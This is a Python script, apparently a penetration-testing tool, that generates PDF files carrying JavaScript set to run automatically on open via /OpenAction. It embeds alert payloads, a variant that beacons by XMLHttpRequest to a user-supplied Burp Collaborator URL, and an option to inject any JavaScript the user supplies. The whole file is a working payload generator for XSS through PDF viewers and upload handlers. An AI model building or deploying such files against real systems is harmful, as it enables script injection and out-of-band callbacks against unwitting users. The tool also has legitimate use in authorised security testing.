import argparse
import sys
import os

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

def pad_content(content, target_size):
    """Pads content to ensure the file size is at least the specified size."""
    padding_size = target_size - len(content.encode('utf-8'))
    if padding_size > 0:
        padding = "\n%Padding\n" + (" " * padding_size)
        return content + padding
    return content

def create_pdf(filename, content):
    content = pad_content(content, 2048)  # Ensure size is at least 2KB
    with open(filename, "w") as file:
        file.write(content)
    actual_size = os.path.getsize(filename)
    if actual_size >= 2048:
        print(f"[+] Created {filename} (size: {actual_size} bytes)")
    else:
        print(f"[!] {filename} size is less than 2KB: {actual_size} bytes")

def create_malpdf1(filename):
    content = '''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (app.alert(1))>> 
trailer
<</Root 1 0 R>>'''
    create_pdf(filename, content)

def create_malpdf2(filename):
    content = '''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (app.alert(1))>> 
trailer
<</Root 1 0 R>>'''
    create_pdf(filename, content)

def create_malpdf3(filename, url):
    content = f'''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
app.alert(1);
var xhr = new XMLHttpRequest();
xhr.open("GET", "{url}", true);
xhr.onreadystatechange = function() {{
    if (xhr.readyState == 4 && xhr.status == 200) {{
        app.alert("OK");
    }} else if (xhr.readyState == 4) {{
        app.alert("Error: " + xhr.status);
    }}
}};
xhr.send();
)>> 
trailer
<</Root 1 0 R>>'''
    create_pdf(filename, content)

def create_malpdf_input(filename, script):
    content = f'''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS ({script})>> 
trailer
<</Root 1 0 R>>'''
    create_pdf(filename, content)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Create Malicious PDF Files Leading to XSS Exploit")

    parser.add_argument(
        '-u', action="store", default=None, dest='url',
        help="Specify the Burp Collaborator URL (e.g., http://f7n8nyakubcwjex3k3we9e265xbozd.burpcollaborator.net")
    parser.add_argument(
        '-o', action="store", default="pdf", dest='output',
        help="Specify the file output (e.g., pdf))")
    parser.add_argument(
        '-s', action="store", default=None, dest='script',
        help="Specify your own JavaScript code (e.g., app.alert(1))")

    args = parser.parse_args()
    output = args.output
    url = args.url
    script = args.script
    output = output.lower()

    if output not in ["pdf"]:
        print("Invalid output. Must be pdf.")
        parser.print_help()
        sys.exit(1)

    try:
        print("[+] Creating PDF files...")
        create_malpdf1("xssPDF-1.pdf")
        create_malpdf2("xssPDF-2.pdf")
        if url:
            if 'http://' in url or 'https://' in url:
                create_malpdf3("xssPDF-3.pdf", url)
            else:
                print(f"You have specified an invalid URL: {url}")
                print("Don't forget to include the schema (http|https)")
                sys.exit(1)
        if script:
            create_malpdf_input("xssPDF-sc.pdf", script)
        print("[-] Done!")

    except Exception as e:
        print(f"Failed to create PDF files. Error: {e}")
        sys.exit(1)
